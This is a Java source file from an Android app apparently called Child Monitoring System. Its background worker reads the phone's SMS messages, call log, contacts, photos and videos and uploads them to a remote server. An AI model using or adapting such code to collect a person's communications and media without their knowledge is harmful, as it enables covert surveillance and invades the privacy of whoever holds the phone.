package com.ChildMonitoringSystem.CMS.WorkManager;

import android.content.Context;
import android.content.Intent;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.ChildMonitoringSystem.CMS.BroadCast.Helper;
import com.ChildMonitoringSystem.CMS.GetDataFromDevice.LoadCallLogFromDevice;
import com.ChildMonitoringSystem.CMS.GetDataFromDevice.LoadContactFromDevice;
import com.ChildMonitoringSystem.CMS.GetDataFromDevice.LoadImageFromExternalStorage;
import com.ChildMonitoringSystem.CMS.GetDataFromDevice.LoadMediaStore;
import com.ChildMonitoringSystem.CMS.GetDataFromDevice.LoadMessageFromDevice;
import com.ChildMonitoringSystem.CMS.Model.INFO_CALL_LOG;
import com.ChildMonitoringSystem.CMS.Model.INFO_IMAGE;
import com.ChildMonitoringSystem.CMS.Model.INFO_MEDIA;
import com.ChildMonitoringSystem.CMS.Model.INFO_MESSAGE;
import com.ChildMonitoringSystem.CMS.Model.INFO_PHONEBOOK;
import com.ChildMonitoringSystem.CMS.Service.Service;
import com.ChildMonitoringSystem.CMS.Service.Service_Upload;
import com.ChildMonitoringSystem.CMS.Value.Constant;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class SendCallLogWork extends Worker {
    private static final String TAG = SendCallLogWork.class.getSimpleName();
    private LoadImageFromExternalStorage loadImageFromExternalStorage;
    public SendCallLogWork(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
    }

    @NonNull
    @Override
    public Result doWork() {
        Context context = getApplicationContext();
        Log.i(TAG, "Sending data to Server started");
        try {
            if(Helper.Checknetwork(context))
            {
                SendMessToServer(context);
                try {
                    Thread.sleep(10000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                SendCallToServer(context);
                try {
                    Thread.sleep(10000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                SendContactToServer(context);
                try {
                    Thread.sleep(10000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                SendImgToServer(context);
                try {
                    Thread.sleep(10000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                SendVideotoServer(context);
            }

        }
        catch (Exception e){
            Result.retry();
        }

        return Result.success();
    }

    private void SendCallToServer(Context ctx) {
        Log.i(TAG, "SendCallToServer: ");
        LoadCallLogFromDevice load = new LoadCallLogFromDevice();
        ArrayList<INFO_CALL_LOG> lst = load.LoadAllCallLogCurrentDay(ctx);
        try {
            Thread.sleep(5000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        Service.apiservice.sendCallLog(lst).enqueue(new Callback<ArrayList<INFO_CALL_LOG>>() {
            @Override
            public void onResponse(Call<ArrayList<INFO_CALL_LOG>> call, Response<ArrayList<INFO_CALL_LOG>> response) {

            }

            @Override
            public void onFailure(Call<ArrayList<INFO_CALL_LOG>> call, Throwable t) {

            }
        });
    }
    private void SendMessToServer(Context ctx) {
        Log.i(TAG, "SendMessToServer: ");
        LoadMessageFromDevice loadMessageFromDevice = new LoadMessageFromDevice();
        ArrayList<INFO_MESSAGE> lst = loadMessageFromDevice.Load_SMS_DbyD(ctx);
        try {
            Thread.sleep(5000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        Service.apiservice.sendMessage(lst).enqueue(new Callback<ArrayList<INFO_MESSAGE>>() {
            @Override
            public void onResponse(Call<ArrayList<INFO_MESSAGE>> call, Response<ArrayList<INFO_MESSAGE>> response) {

            }

            @Override
            public void onFailure(Call<ArrayList<INFO_MESSAGE>> call, Throwable t) {

            }
        });
    }
    private void SendImgToServer(Context ctx) {
        Log.i(TAG, "SendImgToServer: ");
        new Thread(() -> {
            loadImageFromExternalStorage = new LoadImageFromExternalStorage();
             ArrayList<INFO_IMAGE> lst = loadImageFromExternalStorage.GetIMageDayByDay(ctx);
            try {
                Thread.sleep(8000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
                if(lst.size()>0)
                {
                    for(INFO_IMAGE info : lst)
                    {
                        String seri = info.getSERI_PHONE();
                        String date = info.getDATE_IMAGE();
                        RequestBody requestBodySeri = RequestBody.create(MediaType.parse("multipart/form-data"),seri);
                        RequestBody requestBodyDate = RequestBody.create(MediaType.parse("multipart/form-data"),date);
                        File file = new File(info.getIMAGES_NAME());
                        RequestBody requestBodyimg = RequestBody.create(MediaType.parse("multipart/form-data"),file);
                        MultipartBody.Part mPart = MultipartBody.Part.createFormData(Constant.KEY_Img,file.getName(),requestBodyimg);
                        Service_Upload.apiservice1.UploadIMG(requestBodySeri,requestBodyDate,mPart).enqueue(new Callback<INFO_IMAGE>() {
                            @Override
                            public void onResponse(Call<INFO_IMAGE> call, Response<INFO_IMAGE> response) {
                                Log.i(TAG, "onResponse: done");
                                Log.i(TAG, "onResponse: " +response.errorBody());
                            }
                            @Override
                            public void onFailure(Call<INFO_IMAGE> call, Throwable t) {
                                Log.i(TAG, "onFailure: fail");
                            }
                        });
                        try {
                            Thread.sleep(1000);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }
                }
                else
                    return;

        }).start();

    }

    private void SendContactToServer(Context ctx) {
        Log.i(TAG, "SendContactToServer: ");
        LoadContactFromDevice loadContactFromDevice = new LoadContactFromDevice();
        ArrayList<INFO_PHONEBOOK> lst = loadContactFromDevice.Load_Contact(ctx);
        try {
            Thread.sleep(5000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        Service.apiservice.sendPhoneBook(lst).enqueue(new Callback<ArrayList<INFO_PHONEBOOK>>() {
            @Override
            public void onResponse(Call<ArrayList<INFO_PHONEBOOK>> call, Response<ArrayList<INFO_PHONEBOOK>> response) {

            }
            @Override
            public void onFailure(Call<ArrayList<INFO_PHONEBOOK>> call, Throwable t) {
            }
        });
    }


    private void SendVideotoServer(Context ctx) {
        LoadMediaStore load =new LoadMediaStore();
        ArrayList<INFO_MEDIA> lst = load.getVideosCurrent(ctx);
        try {
            Thread.sleep(5000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        new Thread(() -> {
            if (lst.size() > 0) {
                for (INFO_MEDIA info : lst) {
                    String seri = info.getSERI_PHONE();
                    String date = info.getDATE_MEDIA();
                    String duaration  = info.getDURATION();
                    RequestBody requestBodySeri = RequestBody.create(MediaType.parse("multipart/form-data"), seri);
                    RequestBody requestBodyDate = RequestBody.create(MediaType.parse("multipart/form-data"), date);
                    RequestBody requestBodyDuration = RequestBody.create(MediaType.parse("multipart/form-data"), duaration);
                    File file = new File(info.getMEDIA_NAME());
                    RequestBody requestBodyimg = RequestBody.create(MediaType.parse("multipart/form-data"), file);
                    MultipartBody.Part mPart = MultipartBody.Part.createFormData(Constant.MEDIA_NAME, file.getName(), requestBodyimg);
                    Service_Upload.apiservice1.UploadVideo(requestBodySeri, requestBodyDate,requestBodyDuration, mPart).enqueue(new Callback<ResponseBody>() {
                        @Override
                        public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                            Log.d("Call request", call.request().toString());
                            Log.d("Call request header", call.request().headers().toString());
                            Log.d("Response raw header", response.headers().toString());
                            Log.d("Response raw", String.valueOf(response.raw().body()));
                            Log.d("Response code", String.valueOf(response.code()));

                            if(response.isSuccessful()) {
                                //the response-body is already parseable to your ResponseBody object
                                ResponseBody responseBody = (ResponseBody) response.body();
                                //you can do whatever with the response body now...
                                String responseBodyString= null;
                                try {
                                    responseBodyString = responseBody.string();
                                } catch (IOException e) {
                                    e.printStackTrace();
                                }
                                Log.d("Response body", responseBodyString);
                            }
                            else  {
                                Log.d("Response errorBody", String.valueOf(response.errorBody()));
                            }
                        }

                        @Override
                        public void onFailure(Call<ResponseBody> call, Throwable t) {
                            String err = t.getMessage() == null ? "" : t.getMessage();
                            Log.i("TAG", "onFailure: "+err);
                        }
                    });
                    try {
                        Thread.sleep(1000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }
        }).start();
    }


}



